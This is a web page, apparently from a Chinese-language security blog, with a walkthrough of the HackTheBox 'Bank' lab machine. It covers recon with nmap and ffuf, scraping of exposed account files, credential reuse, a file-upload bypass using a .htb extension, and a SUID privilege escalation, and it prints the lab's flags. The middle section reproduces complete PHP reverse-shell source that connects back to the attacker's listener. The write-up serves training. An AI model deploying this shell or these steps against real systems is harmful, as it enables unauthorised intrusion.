@@ -1,0 +1,906 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Bank - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Bank靶场信息                                                                                                            靶场类型">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bank - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Bank靶场信息                                                                                                            靶场类型">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/9389a965-ea28-4096-a234-c29cd50f0674.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/06b06f3b-8f61-467f-90ab-5d23d93c8e5f.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/b1df3f12-10a7-49e8-91e7-8ee608a37d0c.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/d5168fe2-57cd-46b8-964d-59b9e9bd6025.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/54d4c451-8a4c-4530-a9ec-7a91e915ad68.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/0d240ea6-72f5-4959-9de0-9cbeafa010c1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/723ee3d4-cdcc-4889-bf36-f696154382ef.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/fba5f3c6-2d3e-42d2-bf8d-6a94eef73272.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/e3815ce2-45b6-4329-9b35-7a8f9909fbff.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/77b0e171-5604-412b-a1b4-0a3e4ad28993.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/e69bfc8f-e153-41e2-a404-bd7eb8540533.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/2cb9488a-66c1-4682-b662-37ec17f3f5dc.png">
+<meta property="article:published_time" content="2022-03-30T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-05-20T01:20:43.017Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/9389a965-ea28-4096-a234-c29cd50f0674.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Bank - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Bank - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-03-30T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-03-30
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Bank"><span class="post-toc-number">1.</span> <span class="post-toc-text">Hackthebox - Bank</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-number">2.</span> <span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-number">3.</span> <span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-number">4.</span> <span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Fuzz"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">Fuzz</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">5.</span> <span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-number">6.</span> <span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox - Bank"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Bank - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-03-30 19:38:36" datetime="2022-03-30T11:38:36.000Z"  itemprop="datePublished">2022-03-30</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Bank"><a href="#Hackthebox-Bank" class="headerlink" title="Hackthebox - Bank"></a>Hackthebox - Bank</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/03/30/Hackthebox%20-%20Bank/9389a965-ea28-4096-a234-c29cd50f0674.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/03/30/Hackthebox%20-%20Bank/06b06f3b-8f61-467f-90ab-5d23d93c8e5f.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root💀kali)-[~/Desktop/HTB/Easy/Bank]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.29
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 01:51 EDT
+Nmap scan report for 10.10.10.29
+Host is up (0.53s latency).
+Not shown: 63750 filtered ports, 1782 closed ports
+PORT   STATE SERVICE    VERSION
+22/tcp open  tcpwrapped
+| ssh-hostkey: 
+|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
+|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
+|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
+|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
+53/tcp open  tcpwrapped
+| dns-nsid: 
+|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
+80/tcp open  tcpwrapped
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=3/28%OT=80%CT=7%CU=30511%PV=Y%DS=2%DC=T%G=Y%TM=62414DA
+OS:A%P=x86_64-pc-linux-gnu)SEQ(CI=I)SEQ(SP=105%GCD=1%ISR=107%TI=Z%II=I%TS=8
+OS:)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS(O1=M54BST11NW7%O2=M54B
+OS:ST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)WIN(W1
+OS:=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%TG=40%W=7210%
+OS:O=M54BNNSNW7%CC=Y%Q=)ECN(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)T1(R=
+OS:Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q
+OS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T4(R=Y%DF=Y
+OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%
+OS:RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%
+OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
+OS:7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A
+OS:=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
+OS:PCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+
+TRACEROUTE (using port 143/tcp)
+HOP RTT       ADDRESS
+1   991.53 ms 10.10.16.1
+2   233.51 ms 10.10.10.29
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 190.30 seconds
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/03/30/Hackthebox%20-%20Bank/b1df3f12-10a7-49e8-91e7-8ee608a37d0c.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>直接访问 ip 地址，会进入 apache 的默认页面，同时我们看到 53 端口打开着，很典型的 DNS 服务器，添加一个解析</p>
+<pre><code class="bash">echo 10.10.10.29 bank.htb
+</code></pre>
+<p>然后去访问一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/03/30/Hackthebox%20-%20Bank/d5168fe2-57cd-46b8-964d-59b9e9bd6025.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>这就有页面了，去 fuzz 一下目录</p>
+<h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ffuf -u &quot;http://bank.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://bank.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+uploads                 [Status: 301, Size: 305, Words: 20, Lines: 10]
+assets                  [Status: 301, Size: 304, Words: 20, Lines: 10]
+inc                     [Status: 301, Size: 301, Words: 20, Lines: 10]
+balance-transfer        [Status: 301, Size: 314, Words: 20, Lines: 10]
+</code></pre>
+<p>前三个都没东西，咱们去看看第四个 <code>balance-transfer</code> </p>
+<p><img src="/2022/03/30/Hackthebox%20-%20Bank/54d4c451-8a4c-4530-a9ec-7a91e915ad68.png"></p>
+<p>有很多的 <code>.acc</code> 结尾的文件，去看一个</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/03/30/Hackthebox%20-%20Bank/0d240ea6-72f5-4959-9de0-9cbeafa010c1.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>这看起来像是存储的用户数据，但是都是加密的，我尝试了一下也无法解密出来，多找找看</p>
+<pre><code class="bash">import requests
+import re
+
+response = requests.get(&quot;http://bank.htb/balance-transfer/&quot;)
+html = response.text
+urls = re.findall(&#39;&lt;a href=&quot;(.*?acc)&quot;&gt;.*?acc&lt;/a&gt;&#39;, html)
+x = 1
+y = len(urls) - 1
+for url in urls:
+    url = &#39;http://bank.htb/balance-transfer/&#39; + url
+    name = url.split(&#39;/&#39;)[-1]
+    response = requests.get(url)
+    with open(name, &quot;wb&quot;) as f:
+        f.write(response.content)
+        print(&#39;【%s】 下载完毕 当前完成任务：%s 次 还剩任务 %s 次&#39; % (url, x, y))
+        x += 1
+        y -= 1
+</code></pre>
+<p>由于数量有点多，所以我写了个简单的爬虫来自动下载文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/03/30/Hackthebox%20-%20Bank/723ee3d4-cdcc-4889-bf36-f696154382ef.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>一共 999 个用户，下载下来看看有没有没有加密的漏网之鱼</p>
+<pre><code class="bash">┌──(root💀kali)-[~/…/HTB/Easy/Bank/Spider]
+└─# grep -r &#39;bank.htb&#39; ./                                                        
+./68576f20e9732f1b2edc4df5b8533230.acc:Email: chris@bank.htb
+</code></pre>
+<p>爬虫爬完了，搜索一下有没有 <code>bank.htb</code> 邮箱的内容，还真搜到了一个</p>
+<pre><code class="bash">┌──(root💀kali)-[~/…/HTB/Easy/Bank/Spider]
+└─# cat 68576f20e9732f1b2edc4df5b8533230.acc                                                                     
+--ERR ENCRYPT FAILED
++=================+
+| HTB Bank Report |
++=================+
+
+===UserAccount===
+Full Name: Christos Christopoulos
+Email: chris@bank.htb
+Password: !##HTBB4nkP4ssw0rd!##
+CreditCards: 5
+Transactions: 39
+Balance: 8842803 .
+===UserAccount===
+</code></pre>
+<p>查看一下内容，成功拿到一个可以用的账号密码</p>
+<p>去登录一下后台看看</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/03/30/Hackthebox%20-%20Bank/fba5f3c6-2d3e-42d2-bf8d-6a94eef73272.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>成功进入后台</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/03/30/Hackthebox%20-%20Bank/e3815ce2-45b6-4329-9b35-7a8f9909fbff.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>主页上没什么功能点，就一个支持，然后在支持里面有一个文件上传功能，我尝试了一下直接上传 phpwebshell，上传失败。我们去看看网页源码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/03/30/Hackthebox%20-%20Bank/77b0e171-5604-412b-a1b4-0a3e4ad28993.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>在 95 行发现这么一句</p>
+<p>将会把 <code>.htb</code> 格式的文件以 <code>.php</code> 格式来运行，OK，思路有了</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><pre><code class="bash">&lt;?php
+set_time_limit (0);
+$VERSION = &quot;1.0&quot;;
+$ip = &#39;10.10.16.4&#39;;  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = &#39;uname -a; w; id; /bin/bash -i&#39;;
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists(&#39;pcntl_fork&#39;)) {
+    // Fork and have the parent process exit
+    $pid = pcntl_fork();
+
+    if ($pid == -1) {
+        printit(&quot;ERROR: Can&#39;t fork&quot;);
+        exit(1);
+    }
+
+    if ($pid) {
+        exit(0);  // Parent exits
+    }
+
+    // Make the current process a session leader
+    // Will only succeed if we forked
+    if (posix_setsid() == -1) {
+        printit(&quot;Error: Can&#39;t setsid()&quot;);
+        exit(1);
+    }
+
+    $daemon = 1;
+} else {
+    printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);
+}
+
+// Change to a safe directory
+chdir(&quot;/&quot;);
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+    printit(&quot;$errstr ($errno)&quot;);
+    exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from
+   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to
+   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+    printit(&quot;ERROR: Can&#39;t spawn shell&quot;);
+    exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);
+
+while (1) {
+    // Check for end of TCP connection
+    if (feof($sock)) {
+        printit(&quot;ERROR: Shell connection terminated&quot;);
+        break;
+    }
+
+    // Check for end of STDOUT
+    if (feof($pipes[1])) {
+        printit(&quot;ERROR: Shell process terminated&quot;);
+        break;
+    }
+
+    // Wait until a command is end down $sock, or some
+    // command output is available on STDOUT or STDERR
+    $read_a = array($sock, $pipes[1], $pipes[2]);
+    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+    // If we can read from the TCP socket, send
+    // data to process&#39;s STDIN
+    if (in_array($sock, $read_a)) {
+        if ($debug) printit(&quot;SOCK READ&quot;);
+        $input = fread($sock, $chunk_size);
+        if ($debug) printit(&quot;SOCK: $input&quot;);
+        fwrite($pipes[0], $input);
+    }
+
+    // If we can read from the process&#39;s STDOUT
+    // send data down tcp connection
+    if (in_array($pipes[1], $read_a)) {
+        if ($debug) printit(&quot;STDOUT READ&quot;);
+        $input = fread($pipes[1], $chunk_size);
+        if ($debug) printit(&quot;STDOUT: $input&quot;);
+        fwrite($sock, $input);
+    }
+
+    // If we can read from the process&#39;s STDERR
+    // send data down tcp connection
+    if (in_array($pipes[2], $read_a)) {
+        if ($debug) printit(&quot;STDERR READ&quot;);
+        $input = fread($pipes[2], $chunk_size);
+        if ($debug) printit(&quot;STDERR: $input&quot;);
+        fwrite($sock, $input);
+    }
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we&#39;ve daemonised ourself
+// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+    if (!$daemon) {
+        print &quot;$string\n&quot;;
+    }
+}
+
+?&gt;
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/03/30/Hackthebox%20-%20Bank/e69bfc8f-e153-41e2-a404-bd7eb8540533.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>将我们的 phpshell 的后缀更改为 <code>.htb</code> 然后去上传</p>
+<p>然后使用 nc 监听一个端口</p>
+<pre><code class="bash">nc -nvlp 4444
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/03/30/Hackthebox%20-%20Bank/2cb9488a-66c1-4682-b662-37ec17f3f5dc.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>传上去以后，点一下附件</p>
+<pre><code class="bash">┌──(root💀kali)-[~/…/HTB/Easy/Bank/Spider]
+└─# nc -nvlp 4444                                      
+listening on [any] 4444 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.29] 37458
+Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux
+ 05:08:13 up 20:18,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+bash: cannot set terminal process group (1072): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@bank:/$ whoami&amp;&amp;id
+whoami&amp;&amp;id
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>成功拿到一个 shell</p>
+<pre><code class="bash">python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;;
+Ctrl+Z 返回
+stty raw -echo; fg
+export TERM=xterm
+stty rows 51 cols 237
+</code></pre>
+<p>修复一下 shell</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><pre><code class="bash">find / -user root -perm -4000 -print 2&gt;/dev/null
+</code></pre>
+<p>搜索一下我们可以用来提升权限的 SUID 文件</p>
+<pre><code class="bash">www-data@bank:/$ find / -user root -perm -4000 -print 2&gt;/dev/null
+/var/htb/bin/emergency
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/traceroute6.iputils
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/mtr
+/usr/sbin/pppd
+/bin/ping
+/bin/ping6
+/bin/su
+/bin/fusermount
+/bin/mount
+/bin/umount
+</code></pre>
+<p>第一个文件一看就不简单，去运行一下</p>
+<pre><code class="bash">www-data@bank:/$ /var/htb/bin/emergency
+# ls
+bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
+# whoami
+root
+</code></pre>
+<p>直接就 root 了？我不是很理解原理</p>
+<pre><code class="bash"># cat /home/chris/user.txt
+20575ef51ddd60d74b616251bc305319
+</code></pre>
+<p>拿到了 user 权限的 flag 文件</p>
+<pre><code class="bash"># cat /root/root.txt
+9e6410fc2696f73f668c5dde1f5d0d99
+</code></pre>
+<p>拿到了 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/&title=《Bank - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/&title=《Bank - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bank - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/03/31/Hackthebox%20-%20Blocky/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Blocky - Hackthebox</h4>
+      </a>
+    </div>
+  
+
